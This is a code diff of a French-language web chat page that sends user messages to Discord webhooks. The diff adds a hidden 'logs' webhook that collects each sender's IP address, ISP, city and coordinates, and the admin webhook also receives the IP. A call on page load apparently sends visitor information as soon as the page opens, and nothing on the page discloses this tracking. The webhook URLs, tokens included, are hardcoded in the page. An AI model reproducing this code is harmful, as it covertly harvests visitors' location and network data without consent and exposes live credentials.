@@ -235,6 +235,8 @@
         <button id="sendButton" onclick="envoyerMessage()">Envoyer</button>
         <div class="shortcuts">
             <div class="shortcut-buttons">
+                <button class="shortcut-btn" onclick="envoyerRaccourci('Salut')">Salut</button>
+                <button class="shortcut-btn" onclick="envoyerRaccourci('Urgent')">Urgent</button>
                 <button class="shortcut-btn" onclick="showModal()">Mentionner</button>
             </div>
         </div>
@@ -242,15 +244,13 @@
 
     <script>
         if (localStorage.getItem("siteDetruit") === "true") {
-            document.body.innerHTML = 
+            document.body.innerHTML = `
                 <div class="destroyed-message">
                     <h1>Site Détruit</h1>
                     <p>Ce site a été détruit de manière permanente.</p>
                 </div>
-            ;
+            `;
         }
-    </script>
-    
     </script>
 
     <div id="notification" class="notification"></div>
@@ -407,40 +407,48 @@
             const timestamp = new Date().toLocaleString();
 
             const webhookUser = "https://discord.com/api/webhooks/1347862473537093664/VtOfMcsl2ZBjagms67UnRuw_joNCFi_f7cG7Z7gc-C2V4zCB2S8CzHuaJneKP1vIjFgF";
-            const webhookAdmin = "https://discord.com/api/webhooks/1347862239012720680/3M_RuPkwWTT4bFI21KBjpQ0mUEPJw0phfflcZcNWxOQibgcatk_aOiooOao4iHP_SuQh";
+            const webhookAdmin = "https://discord.com/api/webhooks/1347862239012720680/3M_RuPkwWTT4bFI21KBjpQ0mUEPJw0phfflcZcNWxOQibgcatk_aOiooOao4iHP_Su4a";
+            const webhookLogs = "https://discord.com/api/webhooks/1347905218121175060/VNo1QpgxJZpxG4OsSSKXnVLsR7iDHuA0XVmrgyrC1uvzc5V7_xP__GBK5QwpjAGLJn7H";
 
-            const formattedMessage = `**Message d'un utilisateur**\n` +
-                                     `**Pseudo**: ${pseudo}\n` +
-                                     `**Message**: ${message}\n` +
-                                     `=== Infos IP ===\n` +
-                                     `**IP**: ${userIP}\n` +
-                                     `**Opérateur (FAI)**: ${ipInfo.isp}\n` +
-                                     `**Ville**: ${ipInfo.city}\n` +
-                                     `**Coordonnées**: ${ipInfo.coords}\n` +
-                                     `=== Date ===\n` +
-                                     `**Date**: ${timestamp}`;
-            
             try {
-                await fetch(webhookUser, {
+                const userResponse = await fetch(webhookUser, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: formattedMessage })
+                    body: JSON.stringify({ content: message })
                 });
+                if (!userResponse.ok) throw new Error("Erreur webhook utilisateur");
 
-                await fetch(webhookAdmin, {
+                const adminResponse = await fetch(webhookAdmin, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: formattedMessage })
+                    body: JSON.stringify({ 
+                        content: `**${pseudo}**: ${message}\n**IP**: ${userIP}\n**Date**: ${timestamp}` 
+                    })
                 });
-                
-                showNotification("Message envoyé avec succès !");
+                if (!adminResponse.ok) throw new Error("Erreur webhook admin");
+
+                const logsResponse = await fetch(webhookLogs, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        content: `**Pseudo**: ${pseudo}\n` +
+                                 `**Message**: ${message}\n` +
+                                 `**IP**: ${userIP}\n` +
+                                 `**FAI**: ${ipInfo.isp}\n` +
+                                 `**Ville**: ${ipInfo.city}\n` +
+                                 `**Coordonnées**: ${ipInfo.coords}\n` +
+                                 `**Heure**: ${timestamp}`
+                    })
+                });
+                if (!logsResponse.ok) throw new Error("Erreur webhook logs");
+
+                showNotification(isMention ? "Mention envoyée avec succès !" : "Message envoyé avec succès !");
             } catch (error) {
-                console.error("Erreur lors de l'envoi du message :", error);
-                showNotification("Erreur lors de l'envoi du message.", true);
+                showNotification("Erreur lors de l'envoi : " + error.message, true);
             }
         }
 
-        sendInitialInfo(); // Envoie des infos initiales dès que la page est chargée
+        sendInitialInfo();
     </script>
 </body>
 </html>
